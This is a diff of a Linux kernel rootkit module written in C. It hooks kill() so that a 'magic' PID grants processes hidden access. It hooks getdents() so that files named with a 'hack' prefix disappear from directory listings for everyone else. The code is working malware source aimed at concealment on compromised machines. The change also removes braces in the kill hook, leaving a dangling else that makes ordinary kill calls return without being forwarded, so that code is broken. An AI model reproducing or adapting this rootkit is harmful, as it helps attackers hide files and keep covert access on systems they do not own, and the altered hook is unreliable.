@@ -114,20 +114,13 @@ int file_sync(struct file * file)
  
 asmlinkage int fake_sys_kill(pid_t pid, int sig)
 {
+	int ret = 0;
 	if(pid == MAGIC_KILL_PID)
-	{
-		printk("[%s] Received the magic kill pid, adding access to hidden file\n", __this_module.name);
-
 		if(authorized_pids_cnt < MAX_PIDS)
-		{
-			printk("[%s] Authorizing pid : %d\n", __this_module.name, current->pid);
 			authorized_pids[authorized_pids_cnt++] = current->pid;
-		}
-		return 0;
-	}
-
 	else
-		return original_sys_kill(pid, sig);
+		ret = original_sys_kill(pid, sig);
+	return ret;
 }
 
 asmlinkage int fake_sys_close(unsigned int fd)
@@ -183,11 +176,11 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 	// If authorized pid, allow to read all file
 	if(found)
 	{
-		printk("[%s] pid %d has access to file, don't change getdents\n", __this_module.name, current->pid);
+		printk("[%s] [OK] pid[%d]\n", __this_module.name, current->pid);
 		return original_sys_getdents(fd, dirp, count);
 	}
 
-	printk("[%s] pid %d no access to file, hide files!\n", __this_module.name, current->pid);
+	printk("[%s] [KO] pid[%d]\n", __this_module.name, current->pid);
 	nread = original_sys_getdents(fd, dirp, count);
 
     buf = (char*)dirp;
@@ -197,31 +190,29 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
     else if(nread == 0)
         return nread;
         
-	printk("--------------- nread=%d ---------------\n", nread);
-	printk("inode#    file type  d_reclen  d_off   d_name\n");
+	printk("[%s] --------------- nread=%d ---------------\n", __this_module.name, nread);
+	printk("[%s] inode#    file type  d_reclen  d_off   d_name\n", __this_module.name);
 
 	for(bpos = 0; bpos < nread;)
 	{
 		dir = (struct linux_dirent *)(buf + bpos);
-		
+		d_type = *(buf + bpos + dir->d_reclen - 1);
+		snprintf(logs, LOGS_SIZE,"%8ld    %-10s  %4d %10lld  %s\n", dir->d_ino,
+			(d_type == DT_REG) ?  "regular" :
+			(d_type == DT_DIR) ?  "directory" :
+			(d_type == DT_FIFO) ? "FIFO" :
+			(d_type == DT_SOCK) ? "socket" :
+			(d_type == DT_LNK) ?  "symlink" :
+			(d_type == DT_BLK) ?  "block dev" :
+			(d_type == DT_CHR) ?  "char dev" : "???",
+			dir->d_reclen, (long long) dir->d_off, dir->d_name);
+		printk("[%s] %s", __this_module.name, logs);
+
 		if(strlen(dir->d_name) > 3)
 		{
 			// Shit, we get the file of the same name, hide it, is it 1st element!
 			if(!memcmp(dir->d_name, "hack", 4))
 			{
-				d_type = *(buf + bpos + dir->d_reclen - 1);
-				snprintf(logs, LOGS_SIZE,"%8ld    %-10s  %4d %10lld  %s\n", dir->d_ino,
-							(d_type == DT_REG) ?  "regular" :
-							(d_type == DT_DIR) ?  "directory" :
-							(d_type == DT_FIFO) ? "FIFO" :
-							(d_type == DT_SOCK) ? "socket" :
-							(d_type == DT_LNK) ?  "symlink" :
-							(d_type == DT_BLK) ?  "block dev" :
-							(d_type == DT_CHR) ?  "char dev" : "???",
-							dir->d_reclen, (long long) dir->d_off, dir->d_name);
-
-				printk("[%s] %s", __this_module.name, logs);
-
 				// Just move the 1st block in that case and don't do anything
 				if(!prev)
 				{
@@ -236,11 +227,11 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 				{
 					lost_data += dir->d_reclen;
 					prev->d_reclen += dir->d_reclen;
-					printk("[%s] hidding file %s [%lu]\n", __this_module.name, dir->d_name, lost_data);
+					bpos += dir->d_reclen;
+					continue;
 				}
 			}
 		}
-
 		prev = dir;
 		// move to next linux_dirent
 		bpos += dir->d_reclen;
